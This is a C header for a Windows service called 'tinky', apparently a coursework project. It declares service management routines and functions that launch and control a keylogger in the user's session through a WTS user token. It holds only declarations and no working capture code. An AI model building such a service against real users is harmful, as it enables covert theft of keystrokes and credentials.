#pragma once

#include <windows.h>
#include <wtsapi32.h>
#include <tchar.h>
#include <strsafe.h>
#include <stdio.h>
#include <aclapi.h>
#include <stdlib.h>

#define SVCNAME TEXT("tinky")

// Global variables
extern SERVICE_STATUS gSvcStatus; 
extern SERVICE_STATUS_HANDLE gSvcStatusHandle; 
extern HANDLE ghSvcStopEvent;
extern TCHAR szCommand[10];
extern TCHAR szSvcName[80];
extern PROCESS_INFORMATION gKeyloggerProcessInfo;

// Service functions
VOID        SvcInstall(void);
VOID WINAPI SvcCtrlHandler(DWORD); 
VOID WINAPI SvcMain(DWORD, LPTSTR*); 
VOID        ReportSvcStatus(DWORD, DWORD, DWORD);
VOID        SvcInit(DWORD, LPTSTR*); 
VOID        SvcReportEvent(LPTSTR);

// Management functions
VOID __stdcall DisplayUsage(void);
VOID __stdcall DoDeleteSvc(void);
VOID __stdcall DoStartSvc(void);
VOID __stdcall DoStopSvc(void);

// New functions for project requirements
BOOL LaunchKeyloggerInUserSession(void);
VOID TerminateKeylogger(void);
BOOL IsKeyloggerRunning(void);
HANDLE GetUserTokenViaWTS(void);
